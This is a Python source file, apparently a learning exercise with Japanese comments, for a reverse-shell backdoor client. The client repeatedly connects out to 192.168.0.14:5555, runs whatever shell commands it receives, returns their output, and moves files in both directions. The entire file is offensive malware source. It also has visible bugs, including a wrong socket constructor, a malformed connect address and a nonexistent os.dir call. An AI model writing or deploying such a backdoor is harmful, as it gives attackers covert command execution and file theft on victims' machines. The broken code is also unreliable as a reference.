import socket
import time
import json
#コマンド実行のためのライブラリ
import subprocess
import os

def reliable_send(data):
    #文字列に変換
    jsondata = json.dumps(data)
    #エンコードしてから送信
    server.send(jsondata.encode())


def reliable_receive():
    data = ''
    while True:
        try:
            #get1024Bite => decode => del \r\n space of the end
            data = data + server.recv(1024).decode().rstrip()
            #str to dict
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    #read byte
    f = open(file_name, 'rb')
    #ファイルをアップロード
    server.send(f.read())


def download_file(file_name):
    #localのfファイルオブジェクトに書き込むのでwrite byte
    f = open(file_name, 'wb')
    #スタック防止のtimeout 1s
    #https://stackoverflow.com/questions/34371096/how-to-use-python-socket-settimeout-properly
    server.settimeout(1)
    chunk = server.recv(1024)#ここでtimeout 1s
    while chunk:#chunkにbyteがフェッチできる間フェッチし続ける
        f.write(chunk)
        try:
            chunk = server.recv(1024)
        except  socket.timeout as e:
            break
    #timeoutを削除
    server.settimeout(None)
    f.close()


def connection():
    #接続できるまで無限ループ
    while True:
        #20s timeout
        time.sleep(20)
        try:
            #make connection to server
            server.connect(('192.168.0.14'), 5555)
            #shell 関数がコマンドを実行
            shell()
            server.close()
            break
        except:
            connection()


def shell():
    while True:
        command = reliable_receive()
        if command == 'exit':
            break
        elif command == 'clear':
            #just clear
            pass
        #first 3 char
        elif command[:3] == 'cd ':
            #change dir
            os.dir(command[3:])
        elif command[:6] == 'upload':
            #こっちはダウンロード側
            download_file(command[7:])
        elif command[:8] == 'download':
            #こっちはアップロードする側
            upload_file(command[9:])
        else:
            #コマンドの実行
            #ProcessOpen
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            #concat stdout, stderr
            result = execute.stdout.read() + execute.stderr.read()
            #エンコードされているのでデコード(エンコードされたものをreliable_sendでエンコードしようとするとエラーになる)
            result = result.decode()
            reliable_send(result)



server = socket(socket.AF_INET, socket.SOCK_STREAM)
connection()